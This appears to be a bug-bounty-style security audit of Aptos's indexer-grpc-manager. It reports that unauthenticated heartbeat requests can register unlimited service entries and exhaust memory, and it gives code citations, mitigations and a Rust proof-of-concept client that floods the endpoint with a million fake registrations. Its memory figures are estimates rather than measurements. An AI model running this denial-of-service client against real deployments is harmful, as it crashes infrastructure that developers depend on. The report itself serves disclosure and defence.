# Audit Report

## Title
Unbounded Memory Consumption via Malicious Service Registration in Indexer gRPC Manager

## Summary
The `handle_live_data_service_info()` function in the indexer-grpc-manager allows any attacker to register unlimited unique service addresses through unauthenticated heartbeat requests, bypassing the per-service 100-state limit and causing unbounded memory consumption until the service crashes.

## Finding Description

The indexer-grpc-manager exposes a public `heartbeat` RPC endpoint that accepts service registration information without authentication or rate limiting. [1](#0-0) 

When a heartbeat contains `LiveDataServiceInfo`, it's processed by `handle_live_data_service_info()`, which uses the provided address to create or retrieve a service entry in a DashMap. [2](#0-1) 

While each individual service's `recent_states` VecDeque is limited to 100 entries via `MAX_NUM_OF_STATES_TO_KEEP`, [3](#0-2)  there is **no limit on the total number of unique service addresses** that can be registered. [4](#0-3) 

Each unique address creates a new `LiveDataService` entry containing a gRPC client/channel and a VecDeque. [5](#0-4) 

The cleanup mechanism only removes services that haven't sent a heartbeat in 60+ seconds. [6](#0-5)  An attacker can prevent cleanup by continuously sending heartbeats for all registered addresses.

**Attack Path:**
1. Attacker sends heartbeat requests with unique service addresses ("service-1", "service-2", ..., "service-N")
2. Each unique address creates a new entry in `live_data_services` DashMap (approximately 25-50 KB per service)
3. Attacker continues sending heartbeats every 30 seconds to keep services "alive"
4. With 1 million services: ~25 GB memory consumption
5. With 10 million services: ~250 GB memory consumption
6. GrpcManager crashes with Out-Of-Memory error

The gRPC server is configured without authentication interceptors or connection limits. [7](#0-6) 

## Impact Explanation

This vulnerability qualifies as **High Severity** under the Aptos bug bounty program classification "API crashes". The indexer-grpc-manager provides critical infrastructure for indexer data availability, and crashing it disrupts all downstream services that depend on indexed blockchain data.

While this does not directly affect blockchain consensus or validator operations (the indexer runs separately from validator nodes), it represents a significant availability attack on the Aptos ecosystem infrastructure that developers and applications rely upon for querying blockchain state and transaction history.

## Likelihood Explanation

This attack is **highly likely** to occur because:
- The heartbeat endpoint is publicly accessible without authentication
- The attack requires only basic gRPC client code
- No specialized knowledge or resources are needed
- An attacker can use multiple connections to parallelize registration
- The cost to the attacker is minimal (network bandwidth for periodic heartbeats)
- The impact is deterministic and guaranteed (memory exhaustion leads to crash)

## Recommendation

Implement the following mitigations:

1. **Add authentication** to the heartbeat endpoint using token-based authentication or mTLS
2. **Implement a hard limit** on total registered services:
   ```rust
   const MAX_TOTAL_SERVICES: usize = 1000;
   
   fn handle_live_data_service_info(...) -> Result<()> {
       if self.live_data_services.len() >= MAX_TOTAL_SERVICES 
           && !self.live_data_services.contains_key(&address) {
           bail!("Maximum number of services reached");
       }
       // ... existing code
   }
   ```
3. **Add rate limiting** per source IP address at the gRPC server level
4. **Implement service registration allowlisting** to only accept heartbeats from known service addresses configured at startup
5. **Add monitoring and alerting** for unusual growth in registered services

The most effective solution is authentication combined with an allowlist of approved service addresses.

## Proof of Concept

```rust
// PoC: Malicious client that registers millions of services
use aptos_protos::indexer::v1::{
    grpc_manager_client::GrpcManagerClient, 
    service_info::Info,
    HeartbeatRequest, 
    ServiceInfo, 
    LiveDataServiceInfo,
};
use aptos_protos::util::timestamp::Timestamp;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let mut client = GrpcManagerClient::connect("http://[grpc-manager-address]").await?;
    
    // Register 1 million unique services
    for i in 0..1_000_000 {
        let address = format!("malicious-service-{}", i);
        let info = LiveDataServiceInfo {
            chain_id: 1,
            timestamp: Some(Timestamp {
                seconds: std::time::SystemTime::now()
                    .duration_since(std::time::UNIX_EPOCH)?
                    .as_secs() as i64,
                nanos: 0,
            }),
            known_latest_version: Some(1000),
            stream_info: None,
            min_servable_version: Some(0),
        };
        
        let request = HeartbeatRequest {
            service_info: Some(ServiceInfo {
                address: Some(address),
                info: Some(Info::LiveDataServiceInfo(info)),
            }),
        };
        
        client.heartbeat(request).await?;
        
        if i % 10000 == 0 {
            println!("Registered {} services", i);
        }
    }
    
    // Keep all services alive by continuously sending heartbeats
    loop {
        for i in 0..1_000_000 {
            // Send heartbeat every 30 seconds per service
            // (spawn tasks to parallelize)
        }
        tokio::time::sleep(tokio::time::Duration::from_secs(30)).await;
    }
}
```

This PoC demonstrates how an attacker can register an arbitrary number of unique service addresses, each consuming memory, until the GrpcManager crashes due to memory exhaustion.

### Citations

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/service.rs (L110-127)
```rust
    async fn heartbeat(
        &self,
        request: Request<HeartbeatRequest>,
    ) -> Result<Response<HeartbeatResponse>, Status> {
        let request = request.into_inner();
        if let Some(service_info) = request.service_info {
            if let Some(address) = service_info.address {
                if let Some(info) = service_info.info {
                    return self
                        .handle_heartbeat(address, info)
                        .await
                        .map_err(|e| Status::internal(format!("Error handling heartbeat: {e}")));
                }
            }
        }

        Err(Status::invalid_argument("Bad request."))
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L36-37)
```rust
// The maximum # of states for each service we keep.
const MAX_NUM_OF_STATES_TO_KEEP: usize = 100;
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L83-103)
```rust
struct LiveDataService {
    client: DataServiceClient<Channel>,
    recent_states: VecDeque<LiveDataServiceInfo>,
}

impl LiveDataService {
    fn new(address: GrpcAddress) -> Self {
        let channel = Channel::from_shared(address)
            .expect("Bad address.")
            .connect_lazy();
        let client = DataServiceClient::new(channel)
            .send_compressed(CompressionEncoding::Zstd)
            .accept_compressed(CompressionEncoding::Zstd)
            .max_encoding_message_size(MAX_MESSAGE_SIZE)
            .max_decoding_message_size(MAX_MESSAGE_SIZE);
        Self {
            client,
            recent_states: VecDeque::new(),
        }
    }
}
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L132-133)
```rust
    live_data_services: DashMap<GrpcAddress, LiveDataService>,
    historical_data_services: DashMap<GrpcAddress, HistoricalDataService>,
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L217-228)
```rust
                for kv in &self.live_data_services {
                    let (address, live_data_service) = kv.pair();
                    let unreachable = live_data_service.recent_states.back().is_some_and(|s| {
                        Self::is_stale_timestamp(
                            s.timestamp.unwrap_or_default(),
                            Duration::from_secs(60),
                        )
                    });
                    if unreachable {
                        unreachable_live_data_services.push(address.clone());
                        continue;
                    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L489-509)
```rust
    fn handle_live_data_service_info(
        &self,
        address: GrpcAddress,
        mut info: LiveDataServiceInfo,
    ) -> Result<()> {
        let mut entry = self
            .live_data_services
            .entry(address.clone())
            .or_insert(LiveDataService::new(address));
        if info.stream_info.is_none() {
            info.stream_info = Some(StreamInfo {
                active_streams: vec![],
            });
        }
        entry.value_mut().recent_states.push_back(info);
        if entry.value().recent_states.len() > MAX_NUM_OF_STATES_TO_KEEP {
            entry.value_mut().recent_states.pop_front();
        }

        Ok(())
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/grpc_manager.rs (L91-104)
```rust
    pub(crate) fn start(&self, service_config: &ServiceConfig) -> Result<()> {
        let service = GrpcManagerServer::new(GrpcManagerService::new(
            self.chain_id,
            self.metadata_manager.clone(),
            self.data_manager.clone(),
        ))
        .send_compressed(CompressionEncoding::Zstd)
        .accept_compressed(CompressionEncoding::Zstd)
        .max_encoding_message_size(MAX_MESSAGE_SIZE)
        .max_decoding_message_size(MAX_MESSAGE_SIZE);
        let server = Server::builder()
            .http2_keepalive_interval(Some(HTTP2_PING_INTERVAL_DURATION))
            .http2_keepalive_timeout(Some(HTTP2_PING_TIMEOUT_DURATION))
            .add_service(service);
```
